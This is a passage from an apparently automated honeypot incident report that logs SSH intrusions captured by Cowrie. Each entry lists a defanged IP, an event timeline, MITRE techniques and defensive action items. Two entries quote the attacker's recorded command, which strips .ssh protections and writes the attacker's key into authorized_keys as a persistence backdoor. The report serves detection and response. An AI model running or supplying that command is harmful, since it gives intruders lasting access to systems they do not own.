| **Last Seen** | 2026-08-20 15:27 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 15:26:52` | `cowrie.session.connect` |
| `2026-08-20 15:26:53` | `cowrie.client.version` |
| `2026-08-20 15:26:53` | `cowrie.client.kex` |
| `2026-08-20 15:26:55` | `cowrie.login.success` |
| `2026-08-20 15:26:55` | `cowrie.direct-tcpip.request` |
| `2026-08-20 15:27:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.12.84[.]172` to AbuseIPDB if not already reported
- [ ] Block `61.12.84[.]172` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-edbc8e90ead0

| Field | Detail |
|---|---|
| **Source IP** | `59.120.8[.]61` |
| **First Seen** | 2026-08-20 15:27 |
| **Last Seen** | 2026-08-20 15:27 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 15:27:05` | `cowrie.session.connect` |
| `2026-08-20 15:27:06` | `cowrie.client.version` |
| `2026-08-20 15:27:06` | `cowrie.client.kex` |
| `2026-08-20 15:27:08` | `cowrie.login.success` |
| `2026-08-20 15:27:09` | `cowrie.direct-tcpip.request` |
| `2026-08-20 15:27:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.120.8[.]61` to AbuseIPDB if not already reported
- [ ] Block `59.120.8[.]61` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19d990b5aed5

| Field | Detail |
|---|---|
| **Source IP** | `34.41.211[.]48` |
| **First Seen** | 2026-08-20 15:27 |
| **Last Seen** | 2026-08-20 15:27 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 15:27:19` | `cowrie.session.connect` |
| `2026-08-20 15:27:19` | `cowrie.client.version` |
| `2026-08-20 15:27:19` | `cowrie.client.kex` |
| `2026-08-20 15:27:21` | `cowrie.login.success` |
| `2026-08-20 15:27:21` | `cowrie.direct-tcpip.request` |
| `2026-08-20 15:27:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.41.211[.]48` to AbuseIPDB if not already reported
- [ ] Block `34.41.211[.]48` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df752ee3f639

| Field | Detail |
|---|---|
| **Source IP** | `207.154.247[.]140` |
| **First Seen** | 2026-08-20 15:27 |
| **Last Seen** | 2026-08-20 15:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 15:27:58` | `cowrie.session.connect` |
| `2026-08-20 15:27:58` | `cowrie.client.version` |
| `2026-08-20 15:27:59` | `cowrie.client.kex` |
| `2026-08-20 15:27:59` | `cowrie.login.success` |
| `2026-08-20 15:28:00` | `cowrie.session.params` |
| `2026-08-20 15:28:00` | `cowrie.command.input` |
| `2026-08-20 15:28:00` | `cowrie.command.failed` |
| `2026-08-20 15:28:00` | `cowrie.log.closed` |
| `2026-08-20 15:28:01` | `cowrie.session.params` |
| `2026-08-20 15:28:01` | `cowrie.command.input` |
| `2026-08-20 15:28:01` | `cowrie.session.file_download` |
| `2026-08-20 15:28:01` | `cowrie.log.closed` |
| `2026-08-20 15:28:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.154.247[.]140` to AbuseIPDB if not already reported
- [ ] Block `207.154.247[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a42ad7476a0

| Field | Detail |
|---|---|
| **Source IP** | `207.154.247[.]140` |
| **First Seen** | 2026-08-20 15:28 |
| **Last Seen** | 2026-08-20 15:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 15:28:01` | `cowrie.session.connect` |
| `2026-08-20 15:28:01` | `cowrie.client.version` |
| `2026-08-20 15:28:01` | `cowrie.client.kex` |
| `2026-08-20 15:28:01` | `cowrie.login.success` |
| `2026-08-20 15:28:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.154.247[.]140` to AbuseIPDB if not already reported
- [ ] Block `207.154.247[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7092691b968c

| Field | Detail |
|---|---|
| **Source IP** | `207.154.247[.]140` |
| **First Seen** | 2026-08-20 15:28 |
| **Last Seen** | 2026-08-20 15:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 15:28:02` | `cowrie.session.connect` |
| `2026-08-20 15:28:02` | `cowrie.client.version` |
| `2026-08-20 15:28:02` | `cowrie.client.kex` |
| `2026-08-20 15:28:02` | `cowrie.login.success` |
| `2026-08-20 15:28:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.154.247[.]140` to AbuseIPDB if not already reported
- [ ] Block `207.154.247[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92f6390e6395

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 15:31 |
| **Last Seen** | 2026-08-20 15:31 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 15:31:04` | `cowrie.session.connect` |
| `2026-08-20 15:31:04` | `cowrie.client.version` |
| `2026-08-20 15:31:05` | `cowrie.client.kex` |
| `2026-08-20 15:31:09` | `cowrie.login.success` |
| `2026-08-20 15:31:11` | `cowrie.direct-tcpip.request` |
| `2026-08-20 15:31:13` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 15:31:13` | `cowrie.direct-tcpip.data` |
| `2026-08-20 15:31:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-adaa25af7943

| Field | Detail |
|---|---|
| **Source IP** | `182.60.128[.]241` |
| **First Seen** | 2026-08-20 15:31 |
| **Last Seen** | 2026-08-20 15:31 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 15:31:17` | `cowrie.session.connect` |
| `2026-08-20 15:31:18` | `cowrie.client.version` |
| `2026-08-20 15:31:18` | `cowrie.client.kex` |
| `2026-08-20 15:31:20` | `cowrie.login.success` |
| `2026-08-20 15:31:21` | `cowrie.direct-tcpip.request` |
| `2026-08-20 15:31:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.60.128[.]241` to AbuseIPDB if not already reported
- [ ] Block `182.60.128[.]241` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02aa447fbc02

| Field | Detail |
|---|---|
| **Source IP** | `95.35.29[.]192` |
| **First Seen** | 2026-08-20 15:31 |
| **Last Seen** | 2026-08-20 15:31 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 15:31:26` | `cowrie.session.connect` |
| `2026-08-20 15:31:26` | `cowrie.client.version` |
| `2026-08-20 15:31:26` | `cowrie.client.kex` |
| `2026-08-20 15:31:28` | `cowrie.login.success` |
| `2026-08-20 15:31:28` | `cowrie.direct-tcpip.request` |
| `2026-08-20 15:31:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.35.29[.]192` to AbuseIPDB if not already reported
- [ ] Block `95.35.29[.]192` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6d42bf7048b

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 15:33 |
| **Last Seen** | 2026-08-20 15:33 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 15:33:04` | `cowrie.session.connect` |
| `2026-08-20 15:33:05` | `cowrie.client.version` |
| `2026-08-20 15:33:05` | `cowrie.client.kex` |
| `2026-08-20 15:33:08` | `cowrie.login.success` |
| `2026-08-20 15:33:08` | `cowrie.direct-tcpip.request` |
| `2026-08-20 15:33:09` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 15:33:09` | `cowrie.direct-tcpip.data` |
| `2026-08-20 15:33:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-133ce10f1789

| Field | Detail |
|---|---|
| **Source IP** | `152.32.212[.]226` |
| **First Seen** | 2026-08-20 15:34 |
| **Last Seen** | 2026-08-20 15:34 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 15:34:13` | `cowrie.session.connect` |
| `2026-08-20 15:34:13` | `cowrie.client.version` |
| `2026-08-20 15:34:14` | `cowrie.client.kex` |
| `2026-08-20 15:34:15` | `cowrie.login.success` |
| `2026-08-20 15:34:16` | `cowrie.session.params` |
| `2026-08-20 15:34:16` | `cowrie.command.input` |
| `2026-08-20 15:34:16` | `cowrie.command.failed` |
| `2026-08-20 15:34:16` | `cowrie.log.closed` |
| `2026-08-20 15:34:17` | `cowrie.session.params` |
| `2026-08-20 15:34:17` | `cowrie.command.input` |
| `2026-08-20 15:34:17` | `cowrie.session.file_download` |
| `2026-08-20 15:34:17` | `cowrie.log.closed` |
| `2026-08-20 15:34:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.212[.]226` to AbuseIPDB if not already reported
- [ ] Block `152.32.212[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-498921792325

| Field | Detail |
|---|---|
| **Source IP** | `152.32.212[.]226` |
| **First Seen** | 2026-08-20 15:34 |
| **Last Seen** | 2026-08-20 15:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 15:34:17` | `cowrie.session.connect` |
| `2026-08-20 15:34:17` | `cowrie.client.version` |
| `2026-08-20 15:34:18` | `cowrie.client.kex` |
| `2026-08-20 15:34:18` | `cowrie.login.success` |
| `2026-08-20 15:34:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.212[.]226` to AbuseIPDB if not already reported
- [ ] Block `152.32.212[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f25c72c6fed

| Field | Detail |
|---|---|
| **Source IP** | `152.32.212[.]226` |
| **First Seen** | 2026-08-20 15:34 |
| **Last Seen** | 2026-08-20 15:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 15:34:19` | `cowrie.session.connect` |
| `2026-08-20 15:34:19` | `cowrie.client.version` |
| `2026-08-20 15:34:19` | `cowrie.client.kex` |
| `2026-08-20 15:34:20` | `cowrie.login.success` |
| `2026-08-20 15:34:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.212[.]226` to AbuseIPDB if not already reported
- [ ] Block `152.32.212[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35db5291a5c8

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 15:41 |
| **Last Seen** | 2026-08-20 15:42 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 15:41:49` | `cowrie.session.connect` |
| `2026-08-20 15:41:49` | `cowrie.client.version` |
| `2026-08-20 15:41:50` | `cowrie.client.kex` |
| `2026-08-20 15:41:52` | `cowrie.login.success` |
| `2026-08-20 15:41:52` | `cowrie.direct-tcpip.request` |
| `2026-08-20 15:41:54` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 15:41:54` | `cowrie.direct-tcpip.data` |
| `2026-08-20 15:42:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa8168574f16

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 15:43 |
| **Last Seen** | 2026-08-20 15:43 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 15:43:39` | `cowrie.session.connect` |
| `2026-08-20 15:43:39` | `cowrie.client.version` |
| `2026-08-20 15:43:40` | `cowrie.client.kex` |
| `2026-08-20 15:43:42` | `cowrie.login.success` |
| `2026-08-20 15:43:44` | `cowrie.direct-tcpip.request` |
| `2026-08-20 15:43:46` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 15:43:46` | `cowrie.direct-tcpip.data` |
| `2026-08-20 15:43:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e687d5e6a9f2

| Field | Detail |
|---|---|
| **Source IP** | `85.11.167[.]121` |
| **First Seen** | 2026-08-20 15:47 |
| **Last Seen** | 2026-08-20 15:50 |
| **Session Duration** | 180s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 15:47:23` | `cowrie.session.connect` |
| `2026-08-20 15:47:23` | `cowrie.login.success` |
| `2026-08-20 15:47:24` | `cowrie.session.params` |
| `2026-08-20 15:50:24` | `cowrie.log.closed` |
| `2026-08-20 15:50:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.11.167[.]121` to AbuseIPDB if not already reported
- [ ] Block `85.11.167[.]121` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a8db176361d

| Field | Detail |
|---|---|
| **Source IP** | `156.238.86[.]2` |
| **First Seen** | 2026-08-20 15:47 |
| **Last Seen** | 2026-08-20 15:47 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 15:47:25` | `cowrie.session.connect` |
| `2026-08-20 15:47:27` | `cowrie.client.version` |
| `2026-08-20 15:47:27` | `cowrie.client.kex` |
| `2026-08-20 15:47:31` | `cowrie.login.success` |
| `2026-08-20 15:47:32` | `cowrie.direct-tcpip.request` |
| `2026-08-20 15:47:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.238.86[.]2` to AbuseIPDB if not already reported
- [ ] Block `156.238.86[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53de7658f8db

| Field | Detail |
|---|---|
| **Source IP** | `221.182.185[.]190` |
| **First Seen** | 2026-08-20 15:47 |
| **Last Seen** | 2026-08-20 15:47 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 15:47:37` | `cowrie.session.connect` |
| `2026-08-20 15:47:38` | `cowrie.client.version` |
| `2026-08-20 15:47:38` | `cowrie.client.kex` |
| `2026-08-20 15:47:41` | `cowrie.login.success` |
| `2026-08-20 15:47:41` | `cowrie.direct-tcpip.request` |
| `2026-08-20 15:47:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.182.185[.]190` to AbuseIPDB if not already reported
- [ ] Block `221.182.185[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e46f64610d27

| Field | Detail |
|---|---|
| **Source IP** | `192.34.128[.]202` |
| **First Seen** | 2026-08-20 15:51 |
| **Last Seen** | 2026-08-20 15:51 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 15:51:15` | `cowrie.session.connect` |
| `2026-08-20 15:51:16` | `cowrie.client.version` |
| `2026-08-20 15:51:16` | `cowrie.client.kex` |
| `2026-08-20 15:51:18` | `cowrie.login.success` |
| `2026-08-20 15:51:18` | `cowrie.direct-tcpip.request` |
| `2026-08-20 15:51:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.34.128[.]202` to AbuseIPDB if not already reported
- [ ] Block `192.34.128[.]202` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ba9f2934b25

| Field | Detail |
|---|---|
| **Source IP** | `222.186.68[.]153` |
| **First Seen** | 2026-08-20 15:51 |
| **Last Seen** | 2026-08-20 15:51 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 15:51:24` | `cowrie.session.connect` |
| `2026-08-20 15:51:25` | `cowrie.client.version` |
| `2026-08-20 15:51:25` | `cowrie.client.kex` |
| `2026-08-20 15:51:29` | `cowrie.login.success` |
| `2026-08-20 15:51:31` | `cowrie.direct-tcpip.request` |
| `2026-08-20 15:51:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.186.68[.]153` to AbuseIPDB if not already reported
- [ ] Block `222.186.68[.]153` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97c1d5925e6d

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 15:52 |
| **Last Seen** | 2026-08-20 15:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 15:52:35` | `cowrie.session.connect` |
| `2026-08-20 15:52:35` | `cowrie.client.version` |
| `2026-08-20 15:52:35` | `cowrie.client.kex` |
| `2026-08-20 15:52:37` | `cowrie.login.success` |
| `2026-08-20 15:52:37` | `cowrie.direct-tcpip.request` |
| `2026-08-20 15:52:37` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 15:52:37` | `cowrie.direct-tcpip.data` |
| `2026-08-20 15:52:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e076934893f

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 15:54 |
| **Last Seen** | 2026-08-20 15:54 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 15:54:15` | `cowrie.session.connect` |
| `2026-08-20 15:54:15` | `cowrie.client.version` |
| `2026-08-20 15:54:15` | `cowrie.client.kex` |
| `2026-08-20 15:54:17` | `cowrie.login.success` |
| `2026-08-20 15:54:18` | `cowrie.direct-tcpip.request` |
| `2026-08-20 15:54:32` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 15:54:32` | `cowrie.direct-tcpip.data` |
| `2026-08-20 15:54:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c8c841ddaf7

| Field | Detail |
|---|---|
| **Source IP** | `60.166.31[.]198` |
| **First Seen** | 2026-08-20 15:56 |
| **Last Seen** | 2026-08-20 15:56 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 15:56:21` | `cowrie.session.connect` |
| `2026-08-20 15:56:23` | `cowrie.client.version` |
| `2026-08-20 15:56:23` | `cowrie.client.kex` |
| `2026-08-20 15:56:29` | `cowrie.login.success` |
| `2026-08-20 15:56:30` | `cowrie.direct-tcpip.request` |
| `2026-08-20 15:56:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.166.31[.]198` to AbuseIPDB if not already reported
- [ ] Block `60.166.31[.]198` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37c3c1aae7ac

| Field | Detail |
|---|---|
| **Source IP** | `24.142.170[.]231` |
| **First Seen** | 2026-08-20 16:00 |
| **Last Seen** | 2026-08-20 16:00 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 16:00:20` | `cowrie.session.connect` |
| `2026-08-20 16:00:21` | `cowrie.client.version` |
| `2026-08-20 16:00:21` | `cowrie.client.kex` |
| `2026-08-20 16:00:22` | `cowrie.login.success` |
| `2026-08-20 16:00:23` | `cowrie.direct-tcpip.request` |
